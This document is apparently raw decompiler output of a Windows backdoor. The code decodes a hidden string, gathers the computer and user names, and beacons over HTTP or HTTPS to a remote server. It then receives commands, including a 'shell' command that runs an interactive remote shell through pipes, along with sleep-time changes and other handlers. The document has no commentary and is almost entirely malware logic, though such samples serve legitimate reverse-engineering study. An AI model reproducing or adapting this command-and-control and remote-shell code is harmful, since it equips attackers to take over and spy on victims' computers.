undefined4 FUN_0040297d(void)

{
  byte *a;
  undefined4 b;
  BOOL c;
  uint d;
  int e;
  char char1;
  CHAR local_2b [35];
  size_t size;
  
  size = strlen(&DAT_004046c8);
  a = (byte *)operator_new(size + 1);
  if (a == (byte *)0x0) {
    b = 1;
  }
  else {
    memset(a,0,size + 1);
    d = 0;
    if (size != 0) {
      e = (int)&DAT_004046c8 - (int)a;
      do {
        d = d + 1;
        *a = (char)a[e] >> 1 & 0x7f;
        a = a + 1;
      } while (d < size);
    }
    size = 0x23;
    char1 = '/';
    c = GetComputerNameA(local_2b,&size);
    if (c == 0) {
      char1 = '\0';
    }
    strcat(&char1,(char *)&_Source_004046c4);
    while (_DAT_004047a4 == 0) {
      FUN_00401406();
      if (_DAT_004047a4 != 0) break;
      Sleep(DAT_004046b4 * 60000);
    }
    b = 0;
  }
  return b;
}

undefined4 FUN_00401406(void)

{
  char *pcVar1;
  size_t sVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  char *pcVar6;
  int iVar7;
  HANDLE hHandle;
  int unaff_EBP;
  uint uVar8;
  
  FUN_00402a90();
  uVar8 = 0;
  *(undefined4 *)(unaff_EBP + -0x30) = 0;
  *(undefined4 *)(unaff_EBP + -0x28) = 0;
  _DAT_004047a0 = 0;
  if ((*(int *)(unaff_EBP + 8) != 0) && (*(int *)(unaff_EBP + 0xc) != 0)) {
    pcVar1 = (char *)operator_new(0x400);
    *(char **)(unaff_EBP + -0x34) = pcVar1;
    if (pcVar1 != (char *)0x0) {
      strcpy(pcVar1,s_Accept:**_Pragma:no-cache_Cache_0040410c);
      strcat(pcVar1,s_Computer:_00404100);
      sVar2 = strlen(pcVar1);
      *(undefined4 *)(unaff_EBP + -0x14) = 0x10;
      *(char **)(unaff_EBP + -0x1c) = pcVar1 + sVar2;
      GetComputerNameA(pcVar1 + sVar2,(LPDWORD)(unaff_EBP + -0x14));
      FUN_0040101c((void *)(unaff_EBP + -0x5c),*(char **)(unaff_EBP + 8),*(char **)(unaff_EBP + 0x c)
                   ,*(char **)(unaff_EBP + 0x10),pcVar1,*(undefined4 *)(unaff_EBP + 0x14),3600000) ;
      *(undefined4 *)(unaff_EBP + -4) = 0;
      do {
        iVar3 = FUN_004010c0(unaff_EBP + -0x5c);
        if (iVar3 != 0) break;
        FUN_004013cc(unaff_EBP + -0x5c);
        uVar8 = uVar8 + 1;
        Sleep(60000);
      } while (uVar8 < 5);
      if (uVar8 != 5) {
        pvVar4 = operator_new(0x10000);
        *(void **)(unaff_EBP + 0xc) = pvVar4;
        pvVar4 = operator_new(0x1000);
        *(void **)(unaff_EBP + 0x14) = pvVar4;
        if ((*(int *)(unaff_EBP + 0xc) != 0) && (pvVar4 != (void *)0x0)) {
          pvVar4 = operator_new(0x200);
          *(void **)(unaff_EBP + 0x10) = pvVar4;
          if (pvVar4 != (void *)0x0) {
            *(undefined4 *)(unaff_EBP + -0x68) = 0xc;
            *(undefined4 *)(unaff_EBP + -0x60) = 1;
            *(undefined4 *)(unaff_EBP + -100) = 0;
            BVar5 = CreatePipe((PHANDLE)(unaff_EBP + -0x2c),(PHANDLE)(unaff_EBP + -0x24),
                               (LPSECURITY_ATTRIBUTES)(unaff_EBP + -0x68),0);
            if (BVar5 != 0) {
              *(undefined4 *)(unaff_EBP + -0x74) = 0xc;
              *(undefined4 *)(unaff_EBP + -0x6c) = 1;
              *(undefined4 *)(unaff_EBP + -0x70) = 0;
              BVar5 = CreatePipe((PHANDLE)(unaff_EBP + -0x20),(PHANDLE)(unaff_EBP + -0x18),
                                 (LPSECURITY_ATTRIBUTES)(unaff_EBP + -0x74),0);
              if (BVar5 != 0) {
                GetWindowsDirectoryA((LPSTR)(unaff_EBP + -0x17c),0x104);
                strcat((char *)(unaff_EBP + -0x17c),s_\tasks_004040f8);
                SetCurrentDirectoryA((LPCSTR)(unaff_EBP + -0x17c));
                sprintf(*(char **)(unaff_EBP + 0xc),s__%s_Connected!_004040e4,
                        *(undefined4 *)(unaff_EBP + -0x1c));
                sVar2 = strlen(*(char **)(unaff_EBP + 0xc));
LAB_004015b9:
                do {
                  do {
                    uVar8 = 0;
                    if ((_DAT_004047a0 != 0) && (sVar2 == 0)) {
                      iVar3 = *(int *)(unaff_EBP + -0x30);
                      pcVar1 = *(char **)(unaff_EBP + 0xc);
                      *pcVar1 = '\0';
                      sVar2 = FUN_00401acb(*(HANDLE *)(unaff_EBP + -0x2c),pcVar1,iVar3);
                    }
                    if (((*(int *)(unaff_EBP + -0x28) == 0) && (_DAT_004047a0 == 0)) && (sVar2 ==  0)
                       ) {
                      strcpy(*(char **)(unaff_EBP + 0xc),(char *)&_Source_004040e0);
                      sVar2 = strlen(*(char **)(unaff_EBP + 0xc));
                      *(undefined4 *)(unaff_EBP + -0x28) = 1;
                    }
                    do {
                      iVar3 = FUN_004012c5((void *)(unaff_EBP + -0x5c),
                                           *(undefined4 *)(unaff_EBP + 0xc),sVar2);
                      if (iVar3 != 0) break;
                      uVar8 = uVar8 + 1;
                      Sleep(30000);
                    } while (uVar8 < 6);
                    if (5 < uVar8) goto LAB_004018b7;
                    sVar2 = 0;
                    memset(*(void **)(unaff_EBP + 0x14),0,0x1000);
                    iVar3 = FUN_0040138f((void *)(unaff_EBP + -0x5c),
                                         *(undefined4 *)(unaff_EBP + 0x14),0x1000,unaff_EBP + -0x1 0)
                    ;
                  } while (iVar3 == 0);
                  do {
                    sVar2 = sVar2 + *(int *)(unaff_EBP + -0x10);
                    if (*(int *)(unaff_EBP + -0x10) == 0) break;
                    iVar3 = FUN_0040138f((void *)(unaff_EBP + -0x5c),
                                         *(int *)(unaff_EBP + 0x14) + sVar2,0x1000,unaff_EBP + -0x 10
                                        );
                  } while (iVar3 != 0);
                } while (sVar2 == 0);
                iVar3 = _strcmpi(s_<h1>Bad_Request_(Invalid_Hostnam_004040b8,
                                 *(char **)(unaff_EBP + 0x14));
                if (iVar3 != 0) {
                  pcVar1 = *(char **)(unaff_EBP + 0x14);
                  *(undefined4 *)(unaff_EBP + -0x28) = 0;
                  *(undefined4 *)(unaff_EBP + -0x30) = 1;
                  **(undefined **)(unaff_EBP + 0xc) = 0;
                  do {
                    pcVar6 = FUN_004019eb(pcVar1);
                    *(char **)(unaff_EBP + -0x1c) = pcVar6;
                    strcpy(*(char **)(unaff_EBP + 0x10),pcVar1);
                    if (*pcVar1 == '\0') {
                      if (_DAT_004047a0 != 0) {
                        iVar3 = -1;
                        goto LAB_0040171b;
                      }
                      goto LAB_0040183d;
                    }
                    iVar3 = 0;
                    FUN_00401a2e(pcVar1,0,' ');
                    pcVar1 = s_shell_0040402c;
                    do {
                      iVar7 = _strcmpi(pcVar1,_Str2_00404780);
                      if (iVar7 == 0) break;
                      pcVar1 = pcVar1 + 8;
                      iVar3 = iVar3 + 1;
                    } while ((int)pcVar1 < 0x404084);
LAB_0040171b:
                    switch(iVar3) {
                    case 0:
                      FUN_00401ba9(*(char **)(unaff_EBP + 0xc),*(HANDLE *)(unaff_EBP + -0x20),
                                   *(HANDLE *)(unaff_EBP + -0x24));
                      break;
                    case 1:
                      FUN_00401e12(*(char **)(unaff_EBP + 0xc));
                      break;
                    case 2:
                      FUN_00402132(*(char **)(unaff_EBP + 0xc));
                      break;
                    case 3:
                    case 4:
                      DAT_00404794 = *(undefined4 *)(unaff_EBP + 8);
                      hHandle = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,lpStartAddress_00402292,
                                             *(LPVOID *)(unaff_EBP + 0xc),0,(LPDWORD)0x0);
                      WaitForSingleObject(hHandle,0xffffffff);
                      CloseHandle(hHandle);
                      break;
                    case 5:
                      FUN_00402645(*(char **)(unaff_EBP + 0xc));
                      break;
                    case 6:
                      *(undefined4 *)(unaff_EBP + -0x14) = 0x101;
                      GetUserNameExA(2,unaff_EBP + -0x280,unaff_EBP + -0x14);
                      strcat(*(char **)(unaff_EBP + 0xc),(char *)(unaff_EBP + -0x280));
                      strcat(*(char **)(unaff_EBP + 0xc),(char *)&_Source_004040b4);
                      break;
                    case 7:
                      FUN_004013a7((void *)(unaff_EBP + -0x5c),s_Sleep_Time:_00404084);
                      do {
                        FUN_004013a7((void *)(unaff_EBP + -0x5c),&DAT_00404768);
                        FUN_0040138f((void *)(unaff_EBP + -0x5c),*(undefined4 *)(unaff_EBP + 0x14) ,
                                     0x1000,unaff_EBP + -0x10);
                      } while (*(int *)(unaff_EBP + -0x10) == 0);
                      pcVar1 = *(char **)(unaff_EBP + 0x14);
                      pcVar1[*(int *)(unaff_EBP + -0x10)] = '\0';
                      iVar3 = atoi(pcVar1);
                      *(int *)(unaff_EBP + -0x14) = iVar3;
                      if (iVar3 != 0) {
                        DAT_004046b4 = iVar3;
                      }
                      FUN_004025a2(*(char **)(unaff_EBP + 0xc),(void *)(unaff_EBP + -0x5c),
                                   *(HANDLE *)(unaff_EBP + -0x18));
                      goto LAB_004018b7;
                    case 8:
                      pcVar1 = s_20111117_004040a8;
LAB_00401833:
                      strcat(*(char **)(unaff_EBP + 0xc),pcVar1);
                      break;
                    case 9:
                      FUN_004027a8(*(char **)(unaff_EBP + 0xc));
                      break;
                    case 10:
                      FUN_004027e6(*(char **)(unaff_EBP + 0xc));
                      break;
                    default:
                      if (_DAT_004047a0 == 0) {
                        pcVar1 = s_Start_shell_first._00404090;
                        goto LAB_00401833;
                      }
                      strcat(*(char **)(unaff_EBP + 0x10),(char *)&_Source_004040b4);
                      FUN_0040199f(*(char **)(unaff_EBP + 0x10),*(HANDLE *)(unaff_EBP + -0x18));
                      *(undefined4 *)(unaff_EBP + -0x30) = 1;
                    }
LAB_0040183d:
                    if (**(char **)(unaff_EBP + -0x1c) == '\0') goto code_r0x00401848;
                    pcVar1 = *(char **)(unaff_EBP + -0x1c);
                  } while( true );
                }
              }
            }
LAB_004018b7:
            pcVar1 = *(char **)(unaff_EBP + -0x34);
          }
        }
      }
      if (_DAT_004047a0 != 0) {
        TerminateProcess(_Dst_00404770,0);
        WaitForSingleObject(_Dst_00404770,0xffffffff);
      }
      FUN_004013cc(unaff_EBP + -0x5c);
      if (*(int *)(unaff_EBP + 0xc) != 0) {
        operator_delete(*(void **)(unaff_EBP + 0xc));
      }
      if (*(int *)(unaff_EBP + 0x14) != 0) {
        operator_delete(*(void **)(unaff_EBP + 0x14));
      }
      operator_delete(pcVar1);
      if (*(int *)(unaff_EBP + 0x10) != 0) {
        operator_delete(*(void **)(unaff_EBP + 0x10));
      }
      CloseHandle(_Dst_00404770);
      CloseHandle(hObject_00404774);
      if (*(int *)(unaff_EBP + -0x2c) != -1) {
        CloseHandle(*(HANDLE *)(unaff_EBP + -0x2c));
      }
      if (*(int *)(unaff_EBP + -0x24) != -1) {
        CloseHandle(*(HANDLE *)(unaff_EBP + -0x24));
      }
      if (*(int *)(unaff_EBP + -0x20) != -1) {
        CloseHandle(*(HANDLE *)(unaff_EBP + -0x20));
      }
      if (*(int *)(unaff_EBP + -0x18) != -1) {
        CloseHandle(*(HANDLE *)(unaff_EBP + -0x18));
      }
      *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
      FUN_00401078((undefined4 *)(unaff_EBP + -0x5c));
    }
  }
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return 0;
code_r0x00401848:
  sVar2 = strlen(*(char **)(unaff_EBP + 0xc));
  goto LAB_004015b9;
}

void FUN_00402a90(void)

{
  undefined auStack_c [12];
  
  ExceptionList = auStack_c;
  return;
}

void * __thiscall FUN_0040101c(void *this,char *param_1,char *param_2,char *param_3,char *param_4,undefined4 param_5 ,
            undefined4 param_6)

{
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 0xc) = 0;
  *(undefined4 *)((int)this + 0x14) = 0;
  *(undefined4 *)((int)this + 0x18) = 0;
  *(undefined4 *)((int)this + 0x1c) = 0;
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined4 *)((int)this + 0x24) = param_5;
  *(undefined ***)this = &PTR_LAB_00403150;
  *(undefined4 *)((int)this + 0x10) = param_6;
  FUN_00401199(this,param_1);
  FUN_004011de(this,param_3);
  FUN_0040123b(this,param_2);
  FUN_00401280(this,param_4);
  return this;
}

undefined4 __thiscall FUN_00401199(void *this,char *param_1)

{
  undefined4 uVar1;
  size_t sVar2;
  char *_Dest;
  
  if (param_1 == (char *)0x0) {
    uVar1 = 0;
  }
  else {
    sVar2 = strlen(param_1);
    if (*(void **)((int)this + 0x18) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x18));
    }
    _Dest = (char *)operator_new(sVar2 + 1);
    *(char **)((int)this + 0x18) = _Dest;
    strcpy(_Dest,param_1);
    uVar1 = 1;
  }
  return uVar1;
}

undefined4 __thiscall FUN_004011de(void *this,char *param_1)

{
  undefined4 uVar1;
  size_t sVar2;
  char *_Dest;
  undefined *puVar3;
  
  if (param_1 == (char *)0x0) {
    uVar1 = 0;
  }
  else {
    sVar2 = strlen(param_1);
    if (*(void **)((int)this + 0x14) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x14));
    }
    _Dest = (char *)operator_new(sVar2 + 2);
    *(char **)((int)this + 0x14) = _Dest;
    strcpy(_Dest,param_1);
    puVar3 = (undefined *)(*(int *)((int)this + 0x14) + sVar2);
    if (puVar3[-1] != '/') {
      *puVar3 = 0x2f;
      *(undefined *)(*(int *)((int)this + 0x14) + 1 + sVar2) = 0;
    }
    uVar1 = 1;
  }
  return uVar1;
}

undefined4 __thiscall FUN_0040123b(void *this,char *param_1)

{
  undefined4 uVar1;
  size_t sVar2;
  char *_Dest;
  
  if (param_1 == (char *)0x0) {
    uVar1 = 0;
  }
  else {
    sVar2 = strlen(param_1);
    if (*(void **)((int)this + 0x1c) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x1c));
    }
    _Dest = (char *)operator_new(sVar2 + 1);
    *(char **)((int)this + 0x1c) = _Dest;
    strcpy(_Dest,param_1);
    uVar1 = 1;
  }
  return uVar1;
}

undefined4 __thiscall FUN_00401280(void *this,char *param_1)

{
  undefined4 uVar1;
  size_t sVar2;
  char *_Dest;
  
  if (param_1 == (char *)0x0) {
    uVar1 = 0;
  }
  else {
    sVar2 = strlen(param_1);
    if (*(void **)((int)this + 0x20) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x20));
    }
    _Dest = (char *)operator_new(sVar2 + 1);
    *(char **)((int)this + 0x20) = _Dest;
    strcpy(_Dest,param_1);
    uVar1 = 1;
  }
  return uVar1;
}

int __fastcall FUN_004010c0(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  size_t sVar4;
  undefined4 uVar5;
  int local_4;
  
  iVar2 = InternetOpenA(*(undefined4 *)(param_1 + 0x1c),0,0,0,0);
  *(int *)(param_1 + 4) = iVar2;
  if (iVar2 != 0) {
    iVar1 = param_1 + 0x10;
    local_4 = param_1;
    if (*(int *)(param_1 + 0x10) != 0) {
      InternetSetOptionA(iVar2,5,iVar1,4);
      InternetSetOptionA(*(undefined4 *)(param_1 + 4),2,iVar1,4);
      local_4 = InternetSetOptionA(*(undefined4 *)(param_1 + 4),6,iVar1,4);
    }
    if (*(int *)(param_1 + 0x24) == 0) {
      uVar5 = 0x84000100;
      uVar3 = 0x50;
    }
    else {
      uVar5 = 0x84803100;
      uVar3 = 0x1bb;
    }
    iVar2 = InternetConnectA(*(undefined4 *)(param_1 + 4),*(undefined4 *)(param_1 + 0x18),uVar3,
                             &DAT_00404768,&DAT_00404768,3,0,0);
    *(int *)(param_1 + 8) = iVar2;
    if (iVar2 != 0) {
      iVar2 = HttpOpenRequestA(iVar2,&DAT_00404010,*(undefined4 *)(param_1 + 0x14),0,&DAT_00404768 ,0
                               ,uVar5,0);
      *(int *)(param_1 + 0xc) = iVar2;
      if (iVar2 != 0) {
        if (*(char **)(param_1 + 0x20) == (char *)0x0) {
          return local_4;
        }
        sVar4 = strlen(*(char **)(param_1 + 0x20));
        if (sVar4 == 0) {
          return local_4;
        }
        iVar2 = HttpAddRequestHeadersA
                          (*(undefined4 *)(param_1 + 0xc),*(undefined4 *)(param_1 + 0x20),0xffffff ff
                           ,0x20000000);
        return iVar2;
      }
    }
  }
  return 0;
}

undefined4 __fastcall FUN_004013cc(int param_1)

{
  if (*(int *)(param_1 + 0xc) != 0) {
    InternetCloseHandle(*(int *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  if (*(int *)(param_1 + 8) != 0) {
    InternetCloseHandle(*(int *)(param_1 + 8));
    *(undefined4 *)(param_1 + 8) = 0;
  }
  if (*(int *)(param_1 + 4) != 0) {
    InternetCloseHandle(*(int *)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  return 1;
}
